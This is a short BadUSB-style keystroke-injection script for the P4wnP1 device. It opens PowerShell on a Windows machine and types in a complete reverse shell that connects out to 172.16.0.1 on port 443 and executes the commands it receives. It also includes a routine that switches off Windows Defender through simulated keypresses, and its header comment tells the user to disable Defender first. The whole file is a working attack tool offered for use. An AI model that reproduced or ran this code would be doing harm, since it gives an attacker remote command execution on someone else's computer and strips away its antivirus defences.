/*
Revshell from revshells.com Powershell#1 to connect reverse to P4wnP1 for interactiv control via wifi.
author: Klau5t4ler0x90 
Spacial Thanks to 0dayCTF

First disable defender!
*/

// sets typing speed to "natural"
function natural() {
  typingSpeed(100,150)	// Wait 100ms between key strokes + an additional random value between 0ms and 150ms (natural)
}

// sets typing speed as fast as possible
function fast() {
  typingSpeed(0,0)
}

// Open an interactive PowerShell console (Windows)
function startPS() {
	press("GUI r");
	delay(1000);
	type("powershell.exe");
  	press("ENTER");
}

//disable WindowsDefender
function disableDefender() {
  press("GUI r");
  delay(1000);
  type("windowsdefender://ThreatSettings");
  delay(1000);
  press("ENTER");
  delay(2000);
  press("SPACE");
  delay(2000);
  press("SHIFT TAB");
  delay(500);
  press("ENTER");
  delay(500);
  press("ALT F4");
}

function revshellviaPowershell() {
  type('$LHOST = "172.16.0.1"; $LPORT = 443; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()')
  press("ENTER");   
}

fast();
layout("de");     //Layout DE or US 

//disableDefender();
delay(500);

startPS();
delay(2000);

revshellviaPowershell();
